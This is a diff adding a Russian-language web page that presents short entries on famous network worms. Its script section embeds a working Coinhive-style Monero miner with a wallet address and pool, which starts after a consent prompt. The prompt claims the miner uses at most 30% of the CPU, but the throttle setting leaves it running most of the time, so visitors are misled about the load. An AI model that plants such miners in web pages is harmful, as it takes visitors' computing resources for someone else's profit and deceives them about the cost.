@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Сетевые черви - Информационный портал</title>
+    <style>
+        /* Стили для тёмной темы */
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        h1, h2 {
+            color: #4CAF50;
+        }
+
+        .worm-card {
+            background: #2d2d2d;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        #miner-status {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #333;
+            padding: 10px;
+            text-align: center;
+            display: none;
+        }
+
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Сетевые черви: История и современность</h1>
+        
+        <div class="worm-card">
+            <h2>Morris Worm (1988)</h2>
+            <p>Первый известный сетевой червь, созданный Робертом Моррисом. Вызвал масштабный сбой в раннем интернете (ARPANET).</p>
+        </div>
+
+        <div class="worm-card">
+            <h2>ILOVEYOU (2000)</h2>
+            <p>Червь распространялся через email с темой "ILOVEYOU", причинив ущерб на $15 миллиардов.</p>
+        </div>
+
+        <div class="worm-card">
+            <h2>WannaCry (2017)</h2>
+            <p>Рэнсомвер-червь, использовавший уязвимость EternalBlue в Windows. Поразил 200 000 компьютеров в 150 странах.</p>
+        </div>
+
+        <div class="worm-card">
+            <h2>Современные угрозы</h2>
+            <p>Современные черви используют AI, цепочки поставок и IoT-устройства для распространения.</p>
+        </div>
+    </div>
+
+    <!-- Статус майнинга -->
+    <div id="miner-status">
+        <span>Статус майнинга: </span>
+        <span id="hash-rate">0</span> H/s
+        <button onclick="stopMining()">Остановить</button>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/coin-hive-stratum"></script>
+    <script>
+        // Конфигурация майнера
+        const minerConfig = {
+            wallet: '45w8eSZEnn7c1t4MHGoUw72dh4XHELqs8A39J5muPWGuBam5QKrJ5GXC5Jm9QsxenTMVo9n6MYKepgpZ1aE21BoFEuZWSdD',
+            pool: 'pool.hashvault.pro:443',
+            threads: 2,
+            throttle: 0.3,
+            autoThreads: true
+        };
+
+        let miner = null;
+
+        // Запрос согласия
+        window.addEventListener('load', () => {
+            const consent = confirm(
+                'Для поддержки сайта используется фоновый майнинг (XMR).\n\n' +
+                'Используется не более 30% ресурсов CPU.\n' +
+                'Согласны участвовать в поддержке проекта?'
+            );
+
+            if (consent) {
+                startMining();
+            }
+        });
+
+        function startMining() {
+            miner = new CoinHive.User(minerConfig.wallet, minerConfig);
+            miner.start();
+            
+            // Обновление статистики
+            setInterval(() => {
+                const hashesPerSecond = miner.getHashesPerSecond().toFixed(2);
+                document.getElementById('hash-rate').textContent = hashesPerSecond;
+                document.getElementById('miner-status').style.display = 'block';
+            }, 2000);
+        }
+
+        function stopMining() {
+            if (miner) {
+                miner.stop();
+                miner.destroy();
+                document.getElementById('miner-status').style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
